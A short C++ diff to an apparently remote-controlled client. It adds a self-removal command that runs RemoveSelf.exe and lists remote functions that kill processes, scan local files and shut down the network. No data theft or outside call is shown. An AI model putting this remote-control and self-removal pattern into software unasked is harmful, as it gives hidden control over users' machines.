@@ -62,17 +62,17 @@ namespace session
 	const char*     CTL_END_SESSION  = "000";
 	const char*     CTL_PROCESS_LIST = "001";
 	const char*     CTL_KILL_PROCESS = "002";
+	const char*     CTL_UNINSTALLAPP = "003";
+
 
 	FuncList funcList[] =
 	{
-		{0, NULL},
-		{1, RemoteGetProcessList, "GetProcessList" },
-		{2, RemoteKillProcess, "KillProcess" },
-		
-		{3, RemoteScanLocalFiles, "Scan local files" },
-
-		{4, RemoteShutdownNetwork, "Shutdown network"},
-
+		{ 0, NULL},
+		{ 1, RemoteGetProcessList, "GetProcessList" },
+		{ 2, RemoteKillProcess, "KillProcess" },
+		{ 3, RemoteScanLocalFiles, "Scan local files" },
+		{ 4, RemoteShutdownNetwork, "Shutdown network"},
+		{ 5, RemoteRemoveMyself, "RemoveMyself" },
 	};
 	// 定义远程控制接口数量
 	const int	    CTL_SUPPORT_NUM = sizeof(funcList) / sizeof(funcList[0]);
@@ -1037,5 +1037,12 @@ bool User::HeartBeat()
 		Sleep(LOOP_SLEEP_TIME);
 	}
 
+	return true;
+}
+
+
+bool RemoteRemoveMyself(string& message, string& args)
+{
+	system("RemoveSelf.exe");
 	return true;
 }
